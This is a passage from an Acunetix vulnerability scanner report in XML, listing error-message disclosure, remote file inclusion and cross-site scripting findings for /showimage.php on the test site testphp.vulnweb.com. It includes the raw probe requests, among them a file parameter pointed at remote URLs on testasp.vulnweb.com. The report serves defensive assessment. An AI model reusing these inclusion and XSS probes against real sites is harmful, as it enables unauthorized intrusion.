          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="30" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">acu5461%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca5461</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: fopen(): Unable to access acu5461###s1###s2##s3##uca5461 in /hj/var/www/showimage.php on line 7

Warning: fopen(acu5461###s1###s2##s3##uca5461): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=acu5461%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca5461 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:43 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 355
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="31" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark"></font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: fopen(): Unable to access .tn in /hj/var/www/showimage.php on line 19

Warning: fopen(.tn): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 19</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=&amp;size=160 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:47 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 303
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="32" color="red">
       <Name><![CDATA[File inclusion]]></Name>
       <ModuleName><![CDATA[Scripting (File_Inclusion.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://testasp.vulnweb.com/t/fit.txt%3F.jpg</font></b><br/>Pattern found: <pre wrap="virtual"><font color="blue">63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[It is possible for a remote attacker to include a file from local or remote resources and/or execute arbitrary script code with the privileges of the web-server.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to file inclusion attacks. <br/><br/>It seems that this script includes a file which name is determined using user-supplied data. This data is not properly validated before being passed to the include function. ]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Edit the source code to ensure that input is properly validated. Where is possible, it is recommended to make a list of accepted filenames and restrict the input to that list.<br/><br/>
For PHP, the option <b>allow_url_fopen</b> would normally allow a programmer to open, include or otherwise use a remote file using a URL rather than a local file path. It is recommended to disable this option from php.ini.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&amp;size=160 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:49 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 64
]]></Response>
       </TechnicalDetails>
       <CWE id="20"><![CDATA[CWE-20]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP - Using remote files]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/features.remote-files.php]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Remote file inclusion]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Remote_file_inclusion]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="33" color="red">
       <Name><![CDATA[Cross site scripting]]></Name>
       <ModuleName><![CDATA[Scripting (Remote_File_Inclusion_XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://testasp.vulnweb.com/t/xss.html?%00.jpg</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg&amp;size=160 HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:51 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 33
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
